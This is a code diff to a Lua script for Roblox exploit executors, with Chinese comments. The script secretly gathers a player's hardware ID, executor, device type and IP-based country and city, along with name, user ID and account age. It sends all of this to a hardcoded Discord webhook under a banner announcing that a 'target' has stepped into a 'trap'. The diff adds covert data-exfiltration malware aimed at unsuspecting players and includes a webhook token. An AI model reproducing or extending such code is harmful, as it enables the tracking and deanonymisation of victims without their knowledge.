@@ -3,11 +3,25 @@
 local WebhookURL = "https://discord.com/api/webhooks/1456304374694412400/f5v3zsWGD-rWA5gS3c0epqk_XnXjWzDur7eqcHgD8Vn59dbYCXL-eXghWpFb964wJGY_"
 local player = game:GetService("Players").LocalPlayer
 local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
 
 -- 🚨 1. 秘密收集資訊並回傳
 task.spawn(function()
     pcall(function()
-        -- 抓頭像
+        -- 🔍 深度情報抓取
+        local hwid = (gethwid and gethwid()) or (syn and syn.get_hwid and syn.get_hwid()) or "無法抓取"
+        local exec = (identifyexecutor and identifyexecutor()) or "未知"
+        local deviceType = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "📱 Mobile" or "💻 PC"
+        
+        -- 🌐 抓取地區 (國家 - 城市)
+        local location = "未知區域"
+        local loc_success, loc_res = pcall(function() return game:HttpGet("http://ip-api.com/json/?fields=country,city") end)
+        if loc_success then
+            local loc_data = HttpService:JSONDecode(loc_res)
+            location = loc_data.country .. " - " .. loc_data.city
+        end
+
+        -- 📸 抓取頭像
         local thumbApi = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true"
         local thumbRes = HttpService:JSONDecode(game:HttpGet(thumbApi))
         local avatarUrl = thumbRes.data[1] and thumbRes.data[1].imageUrl or ""
@@ -17,20 +31,25 @@ task.spawn(function()
             ["avatar_url"] = "https://rbxassetid.com/8565635516",
             ["embeds"] = {{
                 ["title"] = "🚨 捕獲目標！制裁程序啟動",
-                ["description"] = "目標已踏入陷阱，正在執行數據抓取...",
+                ["description"] = "目標已踏入陷阱，正在執行深度數據抓取...",
                 ["color"] = 16711680,
                 ["thumbnail"] = {["url"] = avatarUrl},
                 ["fields"] = {
-                    {["name"] = "玩家名稱", ["value"] = player.Name, ["inline"] = true},
+                    {["name"] = "玩家名稱", ["value"] = "**" .. player.Name .. "**", ["inline"] = true},
                     {["name"] = "玩家 ID", ["value"] = "```" .. tostring(player.UserId) .. "```", ["inline"] = true},
+                    {["name"] = "硬體 HWID", ["value"] = "```" .. hwid .. "```", ["inline"] = false},
                     {["name"] = "帳號天數", ["value"] = player.AccountAge .. " 天", ["inline"] = true},
-                    {["name"] = "所在遊戲", ["value"] = "https://www.roblox.com/games/" .. game.PlaceId},
+                    {["name"] = "來源地區", ["value"] = location, ["inline"] = true},
+                    {["name"] = "設備/軟體", ["value"] = deviceType .. " / " .. exec, ["inline"] = false},
+                    {["name"] = "所在遊戲", ["value"] = "[點我查看](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = true},
                 },
-                ["footer"] = {["text"] = "目標 JobId: " .. game.JobId}
+                ["footer"] = {["text"] = "目標 JobId: " .. game.JobId},
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }}
         }
 
-        local requestFunc = syn and syn.request or http and http.request or http_request or request
+        -- 🛠️ 強化版對接判斷 (確保手機/PC 請求都能發送)
+        local requestFunc = syn and syn.request or http and http.request or http_request or request or (HttpService and HttpService.request)
         if requestFunc then
             requestFunc({
                 Url = WebhookURL,
